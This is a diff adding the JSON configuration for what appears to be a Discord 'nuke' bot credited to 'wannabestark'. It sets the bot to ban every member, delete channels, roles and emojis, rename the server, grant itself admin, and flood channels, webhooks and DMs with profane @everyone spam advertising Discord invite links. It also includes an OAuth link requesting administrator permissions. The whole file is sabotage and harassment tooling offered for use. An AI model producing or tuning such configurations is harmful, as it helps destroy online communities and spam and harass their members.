@@ -1,0 +1,54 @@
+{
+    "token": "",
+    "max_concurrent": 100,
+    "proxy": false,
+    "nuke": {
+        "channel_names": [
+            "nuked-by-wannabestark",
+            "wizzed-by-wannabestark",
+            "fucked-by-wannabestark"
+        ],
+        "roles_name": [
+            "stfu wannabestark run you",
+            "wannabestark owns you",
+            "wannabestark fucked your ass"
+        ],
+        "messages_content": [
+            "# @everyone @here Nuked by wannabestark join https://discord.gg/codez https://discord.gg/urbancheats",
+            "# @everyone @here wannabestark owns you all — join https://discord.gg/codez https://discord.gg/urbancheats",
+            "# @everyone @here destroyed by wannabestark  — join https://discord.gg/codez https://discord.gg/urbancheats"
+        ],
+        "delete_all_channels": false,
+        "webhooks": {
+            "name": "WannaBeStark?",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1501493730555727876/1501495182322044958/demon.jpg?ex=6a0ac85b&is=6a0976db&hm=ea97e625c80e946ebd6ae2952d01885a967e5ea8653a6bc6548a2cc1c78377f4&",
+            "messages": [
+                "# @everyone @here Nuked by wannabestark join https://discord.gg/codez https://discord.gg/urbancheats",
+                "# @everyone @here wannabestark owns you all — join https://discord.gg/codez https://discord.gg/urbancheats",
+                "# @everyone @here destroyed by wannabestark  — join https://discord.gg/codez https://discord.gg/urbancheats"
+            ]
+        }
+    },
+    "nuke_all": {
+        "ban_members": true,
+        "delete_channels": true,
+        "delete_roles": true,
+        "delete_emojis": true,
+        "change_guild_name": true,
+        "create_channels": true,
+        "create_roles": true,
+        "spam_webhooks": true
+    },
+    "operations": {
+        "ban_reason": "Nuked by WannaBeStark",
+        "nick_users_to": "Wizzed by wannabestark",
+        "dm_message": "@everyone @here wannabestark wizzed your ass — https://discord.gg/codez https://discord.gg/urbancheats",
+        "spam_message": "@everyone @here wannabestark wizzed your ass — https://discord.gg/codez https://discord.gg/urbancheats",
+        "guild_name": "WannaBeStark? Ownz",
+        "guild_icon": "https://cdn.discordapp.com/attachments/1501493730555727876/1501495182322044958/demon.jpg?ex=6a0ac85b&is=6a0976db&hm=ea97e625c80e946ebd6ae2952d01885a967e5ea8653a6bc6548a2cc1c78377f4&",
+        "channel_type": 0,
+        "enable_auto_admin": true,
+        "emoji_rename_to": "Wizzed by wannabestark",
+        "ouath2": "https://discord.com/oauth2/authorize?client_id=1430087425371279432&permissions=8&integration_type=0&scope=bot"
+    }
+}
